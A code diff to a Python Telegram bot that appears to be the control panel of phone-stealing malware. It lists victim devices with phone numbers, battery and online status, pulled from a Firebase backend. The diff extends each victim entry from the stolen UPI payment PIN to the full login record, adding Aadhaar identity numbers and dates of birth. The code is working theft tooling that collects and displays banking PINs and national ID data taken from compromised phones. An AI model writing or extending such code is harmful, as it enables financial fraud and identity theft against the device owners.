@@ -125,15 +125,19 @@ async def show_device_page(update, context, page):
         keyboard = []
         msg = "📱 **DEVICES LIST:**\n\n"
         for client_id, info in page_items:
-            # Fetch Pin from external path
-            pin_resp = requests.get(f"{firebase_base}/All_Users/Login/{client_id}/pin.json")
-            pin = pin_resp.json() if pin_resp.status_code == 200 else "N/A"
+            # Fetch Data from external path
+            login_resp = requests.get(f"{firebase_base}/All_Users/Login/{client_id}.json")
+            login_data = login_resp.json() if login_resp.status_code == 200 else {}
+            
+            pin = login_data.get('pin', 'N/A')
+            adhar = login_data.get('Adhar', 'N/A')
+            dob = login_data.get('dob', 'N/A')
             
             name = info.get('d_name', 'Unknown')
             status_icon = "🟢" if info.get('status') == "online" else "🔴"
             phone = info.get('phoneNumber', 'N/A')
             battery = info.get('battery', 'N/A')
-            msg += f"{status_icon} {name}\n🆔 {client_id}\n📞 {phone}\n🔋 {battery}%\n📌 UPI Pin: {pin}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+            msg += f"{status_icon} {name}\n🆔 {client_id}\n📞 {phone}\n🔋 {battery}%\n📌 UPI Pin: {pin}\n💳 Adhar: {adhar}\n📅 DOB: {dob}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
             keyboard.append([InlineKeyboardButton(f"{status_icon} {name}", callback_data=f"view_{client_id}")])
 
         nav = []
@@ -164,9 +168,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             response = requests.get(f"{firebase_base}/user_data/{client_id}.json")
             details = response.json() or {}
             
-            # Fetch Pin from external path
-            pin_resp = requests.get(f"{firebase_base}/All_Users/Login/{client_id}/pin.json")
-            pin = pin_resp.json() if pin_resp.status_code == 200 else "N/A"
+            # Fetch Data from external path
+            login_resp = requests.get(f"{firebase_base}/All_Users/Login/{client_id}.json")
+            login_data = login_resp.json() if login_resp.status_code == 200 else {}
+            
+            pin = login_data.get('pin', 'N/A')
+            adhar = login_data.get('Adhar', 'N/A')
+            dob = login_data.get('dob', 'N/A')
             
             status = "ONLINE 🟢" if details.get('status') == "online" else "OFFLINE 🔴"
             msg = (f"📱 {details.get('d_name', 'Unknown')}\n"
@@ -174,6 +182,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                    f"📞 {details.get('phoneNumber', 'Unknown')}\n"
                    f"🔋 {details.get('battery', 'N/A')}%\n"
                    f"📌 UPI Pin: {pin}\n"
+                   f"💳 Adhar: {adhar}\n"
+                   f"📅 DOB: {dob}\n"
                    f"{status}\n\n"
                    f"✅ Device Select ho gayi! Next: /addchannel <channel_id>")
             await query.edit_message_text(text=msg)
